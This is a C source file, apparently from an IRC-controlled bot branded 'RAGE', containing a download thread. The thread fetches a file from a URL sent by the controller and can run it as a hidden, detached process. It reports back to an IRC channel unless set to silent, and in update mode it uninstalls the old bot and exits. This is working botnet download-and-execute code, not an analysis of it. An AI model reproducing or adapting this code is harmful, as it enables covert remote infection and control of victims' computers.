#include "include.h"


DWORD WINAPI DownloadThread(LPVOID param) {

	HANDLE H, O;
	FILE *F;
	char *Buf;
	DWORD R;
	unsigned long fSize;
	char Buffer[MAX_LINE_SIZE];

	DOWNLOAD dl = *((DOWNLOAD *)param);
	DOWNLOAD *dls = (DOWNLOAD *)param;
	dls->GotInfo = TRUE;

#ifdef DEBUG
	printf("Starting to download: %s\n", dl.Url);
#endif

	O = InternetOpen("Mozilla/4.0 (compatible)", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);

	H = InternetOpenUrl(O, dl.Url, NULL, 0, 0, 0);
	if (H != NULL) {
		if (dl.Text)
			F = fopen(dl.Destination, "wt");
		else
			F = fopen(dl.Destination, "wb");
		if (F == NULL) {
#ifdef DEBUG
			printf("Failed to open file: %s\n", dl.Destination);
#endif
			ExitThread(0);
		}
		Buf = (char *) malloc (1);
		fSize = 0;
		do {
			memset(Buf, 0, 1);
			InternetReadFile(H, Buf, 1, &R);
			fwrite(Buf, 1, 1, F);
			fSize++;
		} while (R > 0);
		fclose(F);

#ifdef DEBUG
		printf("File downloaded to: %s, total: %d KBytes\n", dl.Destination, fSize/1024);
#endif

		//We just downloaded file, nothing else
		if (dl.Run == 0) 
		{
			_snprintf(Buffer, sizeof(Buffer), "Downloaded %d KB.", fSize/1024);
			if (!dl.Silent) IrcPrivmsg(dl.Sock, dl.CurrentChannel, Buffer);
			memset(Buffer, 0, sizeof(Buffer));
		}

		//Just run the file
		else if (dl.Run == 1 || dl.Run == 2) 
		{
			PROCESS_INFORMATION pinfo;
			STARTUPINFO sinfo;
			memset(&pinfo, 0, sizeof(pinfo));
			memset(&sinfo, 0, sizeof(sinfo));
			sinfo.lpTitle = "";
			sinfo.cb = sizeof(sinfo);
			sinfo.dwFlags = STARTF_USESHOWWINDOW;
			sinfo.wShowWindow = SW_HIDE;

			if (CreateProcess(NULL, dl.Destination, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo) == TRUE) 
			{
				CloseHandle(pinfo.hProcess);
				CloseHandle(pinfo.hThread);
				
				//Update
				if (dl.Run == 2) 
				{
					_snprintf(Buffer, sizeof(Buffer), "\2RAGE:\2 file running: %d KB, now removing", fSize/1024);
					if (!dl.Silent) IrcPrivmsg(dl.Sock, dl.CurrentChannel, Buffer);
					memset(Buffer, 0, sizeof(Buffer));

					Uninstall();

					WSACleanup();
					ExitProcess(0);
				}

				else 
				{
					_snprintf(Buffer, sizeof(Buffer), "\2RAGE:\2 file running: %d KB.", fSize/1024);
					if (!dl.Silent) IrcPrivmsg(dl.Sock, dl.CurrentChannel, Buffer);
					memset(Buffer, 0, sizeof(Buffer));
				}

			} 
			else 
			{
				_snprintf(Buffer, sizeof(Buffer), "\2RAGE:\2 failed to run: %d KB.", fSize/1024);
				if (!dl.Silent) IrcPrivmsg(dl.Sock, dl.CurrentChannel, Buffer);
				memset(Buffer, 0, sizeof(Buffer));
			}
		}
		
	} else {
#ifdef DEBUG
		printf("Failed to get internet file.\n");
#endif
		if (!dl.Silent) IrcPrivmsg(dl.Sock, dl.CurrentChannel, "\2RAGE:\2 download failed.");
	}

	ClearThread(dl.ThreadNum);
	ExitThread(0);
}